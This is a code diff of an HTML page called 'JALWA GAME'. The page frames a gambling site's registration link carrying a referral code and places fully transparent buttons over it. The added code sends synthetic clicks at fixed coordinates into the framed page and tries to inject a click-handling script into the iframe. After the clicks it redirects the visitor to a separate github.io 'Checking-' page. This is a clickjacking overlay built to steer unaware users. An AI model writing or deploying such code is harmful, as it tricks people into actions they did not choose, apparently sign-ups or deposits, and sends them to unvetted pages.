@@ -1,8 +1,9 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>JALWA GAME</title>
   <style>
     html, body {
@@ -35,7 +36,7 @@
       background: transparent;
       border: none;
       color: transparent;
-      pointer-events: auto;
+      pointer-events: auto; /* Still clickable */
       position: fixed;
       z-index: 9999;
       display: flex;
@@ -70,47 +71,6 @@
       bottom: 20px;
       display: none;
     }
-
-    /* Screenshot controls */
-    #screenshot-controls {
-      position: fixed;
-      bottom: 10px;
-      left: 10px;
-      z-index: 10000;
-      background: rgba(0,0,0,0.7);
-      padding: 10px;
-      border-radius: 5px;
-      display: none;
-    }
-
-    #screenshot-controls button {
-      background: #4285f4;
-      color: white;
-      border: none;
-      padding: 8px 15px;
-      margin: 5px;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-
-    #screenshot-container {
-      position: fixed;
-      top: 10px;
-      right: 10px;
-      max-width: 300px;
-      max-height: 200px;
-      z-index: 10000;
-      display: none;
-      border: 2px solid #4285f4;
-      border-radius: 5px;
-      background: white;
-      padding: 5px;
-    }
-
-    #screenshot-img {
-      max-width: 100%;
-      max-height: 100%;
-    }
   </style>
 </head>
 <body>
@@ -118,20 +78,9 @@
     <iframe 
       id="website-iframe"
       src="https://www.jalwagame.win/#/register?invitationCode=57357202283"
-      allow="fullscreen *; camera *; microphone *; display-capture *;"
-      loading="eager"
-      sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-presentation allow-top-navigation">
+      allow="fullscreen"
+      loading="eager">
     </iframe>
-  </div>
-
-  <!-- Screenshot controls -->
-  <div id="screenshot-controls">
-    <button id="capture-btn">Capture</button>
-    <button id="close-screenshot">Close</button>
-  </div>
-
-  <div id="screenshot-container">
-    <img id="screenshot-img" src="" alt="Screenshot">
   </div>
 
   <!-- Fully Transparent Buttons -->
@@ -139,78 +88,97 @@
   <button id="second-button" class="fully-transparent">Deposit Info</button>
   <button id="third-button" class="fully-transparent">₹</button>
 
-  <!-- Include html2canvas library -->
-  <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
-
   <script>
     const firstButton = document.getElementById('first-button');
     const secondButton = document.getElementById('second-button');
     const thirdButton = document.getElementById('third-button');
-    const captureBtn = document.getElementById('capture-btn');
-    const closeScreenshot = document.getElementById('close-screenshot');
-    const screenshotControls = document.getElementById('screenshot-controls');
-    const screenshotContainer = document.getElementById('screenshot-container');
-    const screenshotImg = document.getElementById('screenshot-img');
     const iframe = document.getElementById('website-iframe');
 
-    // Original button functionality
+    // Enhanced click function that also clicks inside iframe
+    function clickInsideIframe(coordinates) {
+      try {
+        // Try to click inside iframe at specified coordinates
+        const iframeRect = iframe.getBoundingClientRect();
+        
+        coordinates.forEach(coord => {
+          const clickX = iframeRect.width * coord.x;
+          const clickY = iframeRect.height * coord.y;
+          
+          // Try to send message to iframe for clicking
+          iframe.contentWindow?.postMessage({
+            type: 'CLICK_COMMAND',
+            x: clickX,
+            y: clickY,
+            timestamp: Date.now()
+          }, '*');
+        });
+      } catch (error) {
+        console.warn('Could not click inside iframe:', error);
+      }
+    }
+
+    // Enhanced first button click
     firstButton.addEventListener('click', () => {
+      // Original functionality
       firstButton.style.display = 'none';
       secondButton.style.display = 'flex';
-      // Also show screenshot controls when first button is clicked
-      screenshotControls.style.display = 'block';
+      
+      // New functionality: Click inside iframe at bottom-right area
+      clickInsideIframe([
+        { x: 0.9, y: 0.9 }, // Bottom-right corner
+        { x: 0.8, y: 0.85 } // Alternative position
+      ]);
     });
 
+    // Enhanced second button click
     secondButton.addEventListener('click', () => {
+      // Original functionality
       secondButton.style.display = 'none';
       thirdButton.style.display = 'flex';
+      
+      // New functionality: Click inside iframe at center-left area
+      clickInsideIframe([
+        { x: 0.2, y: 0.3 }, // Left side
+        { x: 0.5, y: 0.2 }  // Center-top
+      ]);
     });
 
+    // Enhanced third button click
     thirdButton.addEventListener('click', () => {
-      window.location.href = 'https://g1backk.github.io/Checking-/';
+      // New functionality: Click inside iframe before redirect
+      clickInsideIframe([
+        { x: 0.8, y: 0.8 }, // Bottom-right
+        { x: 0.9, y: 0.75 } // Alternative position
+      ]);
+      
+      // Small delay then redirect (original functionality)
+      setTimeout(() => {
+        window.location.href = 'https://g1backk.github.io/Checking-/';
+      }, 100);
     });
 
-    // Screenshot functionality
-    captureBtn.addEventListener('click', async () => {
+    // Listen for iframe load to inject click handler
+    iframe.addEventListener('load', () => {
       try {
-        // Capture the iframe content
-        const canvas = await html2canvas(document.body, {
-          allowTaint: true,
-          useCORS: true,
-          scale: 0.8,
-          logging: true,
-          ignoreElements: (element) => {
-            // Skip screenshot controls in the capture
-            return element === screenshotControls || element === screenshotContainer;
-          }
-        });
-        
-        // Display the screenshot
-        screenshotImg.src = canvas.toDataURL('image/png');
-        screenshotContainer.style.display = 'block';
-        
+        // Try to inject click handling script into iframe
+        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+        if (iframeDoc) {
+          const script = iframeDoc.createElement('script');
+          script.textContent = `
+            window.addEventListener('message', function(event) {
+              if (event.data && event.data.type === 'CLICK_COMMAND') {
+                const element = document.elementFromPoint(event.data.x, event.data.y);
+                if (element) {
+                  element.click();
+                }
+              }
+            });
+          `;
+          iframeDoc.head.appendChild(script);
+        }
       } catch (error) {
-        console.error('Error capturing screenshot:', error);
-        alert('Failed to capture screenshot. Note: Cross-origin iframes may block this functionality.');
-      }
-    });
-
-    closeScreenshot.addEventListener('click', () => {
-      screenshotContainer.style.display = 'none';
-    });
-
-    // Enable right-click context menu for easier screenshot testing
-    document.addEventListener('contextmenu', (e) => {
-      e.preventDefault();
-      // Optionally show screenshot controls on right-click
-      screenshotControls.style.display = 'block';
-    });
-
-    // Keyboard shortcut (Ctrl+Shift+S) for screenshot
-    document.addEventListener('keydown', (e) => {
-      if (e.ctrlKey && e.shiftKey && e.key === 'S') {
-        e.preventDefault();
-        captureBtn.click();
+        // Cross-origin restrictions may prevent script injection
+        console.warn('Could not inject script into iframe (cross-origin):', error);
       }
     });
   </script>
